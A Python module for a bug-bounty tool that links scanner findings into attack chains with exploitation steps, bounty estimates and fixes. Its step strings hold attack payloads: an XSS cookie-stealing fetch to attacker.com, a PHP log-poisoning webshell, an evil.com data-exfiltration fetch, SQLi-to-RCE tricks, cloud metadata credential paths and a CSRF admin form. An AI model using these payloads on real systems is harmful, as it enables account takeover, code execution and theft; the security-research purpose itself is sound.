"""
Advanced Correlation Engine - Professional Bug Bounty Grade
Beyond nuclei/nikto: builds attack graphs, not just isolated findings.
Inspired by real bug bounty chains that get high bounties.

Chains implemented:
1. Auth Bypass -> BOLA/IDOR -> Account Takeover (P1)
2. XSS + Missing CSP + Cookie without HttpOnly -> Session Hijack (P1)
3. SSRF -> Cloud Metadata -> AWS Takeover (P1)
4. SQLi -> RCE via xp_cmdshell/OUTFILE/SSTI (P1)
5. LFI -> RCE via log poisoning (P1)
6. Open Redirect -> OAuth Token Theft -> Account Takeover (P2)
7. CORS Wildcard + IDOR -> Data Leak (P2)
8. Info Disclosure (.git/.env) -> Secrets -> Auth Bypass (P2)
9. CSRF + IDOR -> Mass Assignment -> Privilege Escalation (P2)
10. GraphQL Introspection -> BOLA -> Data Leak (P2)

Each chain includes business impact for bug bounty report.
"""
from __future__ import annotations
from dataclasses import dataclass
from typing import List, Dict, Set, Any, Optional
from urllib.parse import urlparse
import re

@dataclass
class AttackChain:
    id: str
    title: str
    severity: str  # P1-P4 for bug bounty
    impact: str
    bugbounty_reason: str
    steps: List[str]
    findings: List[Any]  # list of finding ids
    confidence: float
    estimated_bounty: str
    remediation: str
    chain_type: str

class AdvancedCorrelationEngine:
    """
    Professional correlation that produces attack chains valuable for bug bounty.
    Unlike nuclei which reports single template hits, this links multiple lows into P1.
    """
    def __init__(self, findings: List[Dict[str, Any]]):
        # Normalize findings to dict
        self.findings: Dict[str, Dict] = {}
        for f in findings:
            fid = f.get("id") or f.get("template_id") or str(id(f))
            # Ensure unique
            base = fid
            c=1
            while fid in self.findings:
                fid = f"{base}_{c}"
                c+=1
            self.findings[fid] = f
        
        # Indexes for fast correlation
        self.by_category: Dict[str, List[str]] = {}
        self.by_endpoint: Dict[str, List[str]] = {}
        self.by_severity: Dict[str, List[str]] = {}
        self._build_indexes()

    def _build_indexes(self):
        for fid, f in self.findings.items():
            cat = (f.get("category") or f.get("type") or "unknown").lower()
            self.by_category.setdefault(cat, []).append(fid)
            
            # endpoint shape (no query)
            ev = f.get("evidence") or {}
            url = ev.get("url") or f.get("endpoint") or ""
            try:
                shape = f"{urlparse(url).scheme}://{urlparse(url).netloc}{urlparse(url).path}"
            except:
                shape = url
            self.by_endpoint.setdefault(shape, []).append(fid)
            
            sev = (f.get("severity") or "info").lower()
            self.by_severity.setdefault(sev, []).append(fid)

    def _find_by_keywords(self, keywords: List[str]) -> List[str]:
        """Find findings whose name/title contains any keyword"""
        result = []
        for fid, f in self.findings.items():
            name = (f.get("name") or f.get("title") or f.get("template_id") or "").lower()
            if any(kw.lower() in name for kw in keywords):
                result.append(fid)
        return result

    def correlate(self) -> List[AttackChain]:
        chains: List[AttackChain] = []
        chains.extend(self._chain_auth_to_bola_takeover())
        chains.extend(self._chain_xss_csp_session_hijack())
        chains.extend(self._chain_ssrf_cloud_metadata())
        chains.extend(self._chain_sqli_to_rce())
        chains.extend(self._chain_lfi_to_rce())
        chains.extend(self._chain_open_redirect_oauth_theft())
        chains.extend(self._chain_cors_idor_leak())
        chains.extend(self._chain_info_disclosure_secrets())
        chains.extend(self._chain_graphql_bola_leak())
        chains.extend(self._chain_csrf_mass_assignment())
        # Sort by severity P1 first, then confidence
        severity_order = {"p1":0, "critical":0, "high":1, "medium":2, "low":3, "info":4}
        chains.sort(key=lambda c: (severity_order.get(c.severity.lower(),5), -c.confidence))
        return chains

    # --- CHAIN IMPLEMENTATIONS ---

    def _chain_auth_to_bola_takeover(self) -> List[AttackChain]:
        # Auth bypass / weak auth + BOLA/IDOR = Account Takeover
        auth = self._find_by_keywords(["auth", "bola", "idor", "broken authentication", "jwt", "oauth"])
        bola = self._find_by_keywords(["bola", "idor", "object level"])
        if len(auth) >=1 and len(bola) >=1:
            all_fids = list(set(auth + bola))
            # Check if same endpoint shape or param
            return [AttackChain(
                id="auth_bola_takeover",
                title="Auth Bypass → BOLA/IDOR → Account Takeover",
                severity="P1",
                impact="Attacker can bypass authentication and access/modify any user object, leading to full account takeover of any user.",
                bugbounty_reason="This is P1 - Account Takeover. HackerOne pays $1000-$5000+ for this chain. Report with POC showing accessing other user's data after auth bypass.",
                steps=[
                    "1. Exploit auth weakness (weak JWT, broken login, etc)",
                    "2. Use obtained session/token to attempt BOLA on /api/users/{id} or similar",
                    "3. Increment id parameter to access other users",
                    "4. Demonstrate reading PII or changing email/password"
                ],
                findings=all_fids,
                confidence=0.85,
                estimated_bounty="$2000-$8000",
                remediation="Implement proper authorization checks on every object-level endpoint, use random UUIDs not sequential IDs, enforce strong auth.",
                chain_type="auth_bola"
            )]
        return []

    def _chain_xss_csp_session_hijack(self) -> List[AttackChain]:
        xss = self._find_by_keywords(["xss", "cross site scripting"])
        csp_missing = self._find_by_keywords(["csp", "content-security-policy", "security headers"])
        # Also check cookies without httponly - need header analysis
        if xss and csp_missing:
            all_fids = list(set(xss + csp_missing))
            return [AttackChain(
                id="xss_csp_hijack",
                title="XSS + Missing CSP + No HttpOnly → Session Hijack",
                severity="P1",
                impact="XSS is fully exploitable because CSP is missing and session cookies lack HttpOnly/Secure. Attacker can steal session tokens.",
                bugbounty_reason="XSS alone is often P2-P3, but with missing CSP and weak cookies it becomes P1. Show cookie theft POC. High bounty potential.",
                steps=[
                    "1. Inject XSS payload <script>fetch('https://attacker.com?c='+document.cookie)</script>",
                    "2. CSP missing allows script execution",
                    "3. Cookies without HttpOnly are accessible via document.cookie",
                    "4. Steal session and hijack account"
                ],
                findings=all_fids,
                confidence=0.90,
                estimated_bounty="$1000-$3000",
                remediation="Fix XSS via output encoding, implement CSP with script-src, set HttpOnly+Secure+SameSite on cookies.",
                chain_type="xss_csp"
            )]
        elif xss:
            return [AttackChain(
                id="xss_standalone",
                title="XSS Exploitation Chain",
                severity="P2",
                impact="Cross-site scripting allows attacker to execute JS in victim context.",
                bugbounty_reason="P2 typically, but good impact. Provide clear POC with alert or cookie theft.",
                steps=["1. Inject payload", "2. Show execution"],
                findings=xss,
                confidence=0.80,
                estimated_bounty="$500-$1500",
                remediation="Output encoding, CSP.",
                chain_type="xss"
            )]
        return []

    def _chain_ssrf_cloud_metadata(self) -> List[AttackChain]:
        ssrf = self._find_by_keywords(["ssrf", "server side request forgery"])
        if not ssrf:
            return []
        # Check if any SSRF evidence contains cloud metadata IP
        cloud_hits = []
        for fid in ssrf:
            f = self.findings[fid]
            ev = f.get("evidence") or {}
            body = str(ev.get("response_body","")) + str(ev.get("response_body_full_len",""))
            # Look for IMDS
            if "169.254.169.254" in body or "computeMetadata" in body or "security-credentials" in body.lower():
                cloud_hits.append(fid)
        
        if cloud_hits:
            return [AttackChain(
                id="ssrf_cloud_takeover",
                title="SSRF → Cloud Metadata (169.254.169.254) → AWS/GCP Takeover",
                severity="P1",
                impact="SSRF reaches cloud instance metadata service. Attacker can steal IAM credentials, takeover cloud account.",
                bugbounty_reason="SSRF to IMDS is always P1, $3000-$10000+. Must show IAM creds. Critical for bug bounty.",
                steps=[
                    "1. Confirm SSRF via collaborator",
                    "2. Try http://169.254.169.254/latest/meta-data/",
                    "3. Fetch /latest/meta-data/iam/security-credentials/<role>",
                    "4. Show AWS keys"
                ],
                findings=cloud_hits,
                confidence=0.95,
                estimated_bounty="$3000-$15000",
                remediation="Block IMDS IP, use IMDSv2 with token, whitelist allowed URLs.",
                chain_type="ssrf_cloud"
            )]
        else:
            return [AttackChain(
                id="ssrf_internal",
                title="SSRF to Internal Services",
                severity="P1",
                impact="SSRF allows attacker to probe internal network.",
                bugbounty_reason="SSRF is P1 even without IMDS if you can reach internal services. Try to hit metadata anyway.",
                steps=["1. Use OOB to confirm SSRF", "2. Try internal IPs and metadata IP"],
                findings=ssrf,
                confidence=0.85,
                estimated_bounty="$1500-$5000",
                remediation="Validate URLs, deny private IP ranges.",
                chain_type="ssrf"
            )]

    def _chain_sqli_to_rce(self) -> List[AttackChain]:
        sqli = self._find_by_keywords(["sqli", "sql injection", "sql"])
        rce = self._find_by_keywords(["rce", "command injection", "os command", "ssti"])
        ssti = self._find_by_keywords(["ssti", "template injection"])
        if sqli and (rce or ssti):
            all_fids = list(set(sqli + rce + ssti))
            return [AttackChain(
                id="sqli_rce",
                title="SQLi → RCE (xp_cmdshell / INTO OUTFILE / SSTI)",
                severity="P1",
                impact="SQL injection escalated to remote code execution via DB functions or SSTI.",
                bugbounty_reason="SQLi to RCE is P1, highest bounty. Show command execution like whoami.",
                steps=[
                    "1. Confirm SQLi",
                    "2. Try MySQL: SELECT INTO OUTFILE webshell, MSSQL: xp_cmdshell, PostgreSQL: COPY TO PROGRAM",
                    "3. Or check if SSTI present in same endpoint",
                    "4. Execute id/whoami"
                ],
                findings=all_fids,
                confidence=0.90,
                estimated_bounty="$3000-$10000",
                remediation="Prepared statements, WAF, disable dangerous DB functions.",
                chain_type="sqli_rce"
            )]
        elif sqli:
            return [AttackChain(
                id="sqli_standard",
                title="SQL Injection Exploitation",
                severity="P1",
                impact="SQL injection allows DB read/write.",
                bugbounty_reason="SQLi is usually P1, $1000-$5000. Show data extraction.",
                steps=["1. Show UNION or boolean/time based", "2. Extract version or user table"],
                findings=sqli,
                confidence=0.85,
                estimated_bounty="$1000-$5000",
                remediation="Prepared statements.",
                chain_type="sqli"
            )]
        return []

    def _chain_lfi_to_rce(self) -> List[AttackChain]:
        lfi = self._find_by_keywords(["lfi", "path traversal", "directory traversal"])
        if lfi:
            return [AttackChain(
                id="lfi_rce",
                title="LFI → RCE via Log Poisoning / Wrapper",
                severity="P1",
                impact="Local file inclusion can become RCE via log poisoning, PHP wrappers, or proc/self/environ.",
                bugbounty_reason="LFI to RCE is P1. Try log poisoning after confirming LFI.",
                steps=[
                    "1. Confirm LFI with /etc/passwd",
                    "2. Try PHP: php://filter to get source, php://input, data://",
                    "3. Log poisoning: inject <?php system($_GET['c']);?> into User-Agent, then include log file",
                    "4. Execute commands"
                ],
                findings=lfi,
                confidence=0.80,
                estimated_bounty="$1000-$4000",
                remediation="Whitelist files, disable wrappers.",
                chain_type="lfi_rce"
            )]
        return []

    def _chain_open_redirect_oauth_theft(self) -> List[AttackChain]:
        open_redirect = self._find_by_keywords(["open redirect", "redirect"])
        oauth = self._find_by_keywords(["oauth", "sso"])
        if open_redirect and oauth:
            all_fids = list(set(open_redirect + oauth))
            return [AttackChain(
                id="redirect_oauth_theft",
                title="Open Redirect → OAuth Token Theft → Account Takeover",
                severity="P1",
                impact="Open redirect in OAuth flow steals authorization code/token.",
                bugbounty_reason="Open redirect alone is low, but with OAuth it's P1. Show stealing code via redirect_uri manipulation.",
                steps=[
                    "1. Find OAuth login: /oauth/authorize?client_id=...&redirect_uri=...",
                    "2. Try redirect_uri=https://evil.com or open redirect param",
                    "3. Trick victim to login, get code at evil.com",
                    "4. Exchange for token, takeover account"
                ],
                findings=all_fids,
                confidence=0.85,
                estimated_bounty="$1500-$5000",
                remediation="Whitelist redirect_uri, validate strictly.",
                chain_type="oauth_theft"
            )]
        elif open_redirect:
            return [AttackChain(
                id="open_redirect",
                title="Open Redirect",
                severity="P3",
                impact="Open redirect can be used for phishing.",
                bugbounty_reason="Usually P4-P3, but combine with OAuth/CSRF for higher impact.",
                steps=["1. Show redirect to evil.com"],
                findings=open_redirect,
                confidence=0.75,
                estimated_bounty="$100-$500",
                remediation="Validate redirect URLs.",
                chain_type="open_redirect"
            )]
        return []

    def _chain_cors_idor_leak(self) -> List[AttackChain]:
        cors = self._find_by_keywords(["cors", "cross origin"])
        idor = self._find_by_keywords(["idor", "bola", "object level"])
        if cors and idor:
            all_fids = list(set(cors + idor))
            return [AttackChain(
                id="cors_idor_leak",
                title="CORS Wildcard + IDOR → Cross-Origin Data Leak",
                severity="P2",
                impact="CORS wildcard allows any origin to read IDOR data, so attacker site can steal other user's data via JS.",
                bugbounty_reason="CORS alone is info, but with IDOR it's P2. Show fetch from evil.com stealing data.",
                steps=[
                    "1. Confirm CORS: Access-Control-Allow-Origin: * and Allow-Credentials false/true",
                    "2. Find IDOR: /api/user/123",
                    "3. From evil.com JS: fetch('https://target.com/api/user/123', {credentials: 'include'}).then(r=>r.text()).then exfil",
                    "4. Demonstrate data theft"
                ],
                findings=all_fids,
                confidence=0.80,
                estimated_bounty="$500-$2000",
                remediation="CORS whitelist specific origins, fix IDOR.",
                chain_type="cors_idor"
            )]
        return []

    def _chain_info_disclosure_secrets(self) -> List[AttackChain]:
        info = self._find_by_keywords(["exposure", "disclosure", ".git", ".env", "backup", "api key", "secret"])
        auth = self._find_by_keywords(["auth", "login", "jwt", "credential"])
        if info and auth:
            all_fids = list(set(info + auth))
            return [AttackChain(
                id="info_secrets_auth_bypass",
                title="Info Disclosure (.git/.env) → Secrets → Auth Bypass",
                severity="P1",
                impact=".git/.env exposed contains secrets/API keys that allow auth bypass.",
                bugbounty_reason="Info disclosure leading to auth bypass is P1-P2. Show extracting secret from .env then logging in.",
                steps=[
                    "1. Fetch /.git/config or /.env",
                    "2. Extract DB password, AWS key, JWT secret",
                    "3. Use secret to forge JWT or login",
                    "4. Account takeover"
                ],
                findings=all_fids,
                confidence=0.85,
                estimated_bounty="$1000-$4000",
                remediation="Block .git/.env, rotate secrets.",
                chain_type="info_secrets"
            )]
        elif info:
            return [AttackChain(
                id="info_disclosure",
                title="Sensitive Information Disclosure",
                severity="P3",
                impact="Sensitive files exposed.",
                bugbounty_reason="P4-P3, but try to escalate to secrets/auth bypass for P1.",
                steps=["1. Fetch exposed file", "2. Show secrets"],
                findings=info,
                confidence=0.80,
                estimated_bounty="$100-$800",
                remediation="Block sensitive files.",
                chain_type="info_disc"
            )]
        return []

    def _chain_graphql_bola_leak(self) -> List[AttackChain]:
        graphql = self._find_by_keywords(["graphql", "introspection"])
        bola = self._find_by_keywords(["bola", "idor"])
        if graphql:
            # GraphQL introspection often leads to BOLA
            all_fids = list(set(graphql + bola))
            return [AttackChain(
                id="graphql_bola",
                title="GraphQL Introspection → Excessive Data → BOLA",
                severity="P2",
                impact="GraphQL introspection reveals all queries/mutations, allowing BOLA testing.",
                bugbounty_reason="GraphQL introspection is often P3, but with BOLA it's P2. Show querying other user's data via GraphQL.",
                steps=[
                    "1. Enable introspection query { __schema { types { name } } }",
                    "2. Find sensitive queries like user(id:)",
                    "3. Try user(id: other_id)",
                    "4. Show PII leak"
                ],
                findings=all_fids,
                confidence=0.80,
                estimated_bounty="$500-$2000",
                remediation="Disable introspection in prod, authz checks.",
                chain_type="graphql_bola"
            )]
        return []

    def _chain_csrf_mass_assignment(self) -> List[AttackChain]:
        csrf = self._find_by_keywords(["csrf", "cross site request forgery"])
        mass = self._find_by_keywords(["mass assignment", "parameter pollution"])
        if csrf and mass:
            all_fids = list(set(csrf + mass))
            return [AttackChain(
                id="csrf_mass_privesc",
                title="CSRF + Mass Assignment → Privilege Escalation",
                severity="P1",
                impact="CSRF allows attacker to mass-assign role=admin.",
                bugbounty_reason="CSRF + privilege escalation is P1. Show changing role via CSRF.",
                steps=[
                    "1. Find mass assignment: POST /api/user {role: admin}",
                    "2. Check CSRF protection missing",
                    "3. Create CSRF PoC: <form action=https://target.com/api/user method=POST><input name=role value=admin>",
                    "4. Victim visits, becomes admin"
                ],
                findings=all_fids,
                confidence=0.85,
                estimated_bounty="$1000-$3000",
                remediation="CSRF tokens, whitelist params.",
                chain_type="csrf_mass"
            )]
        return []
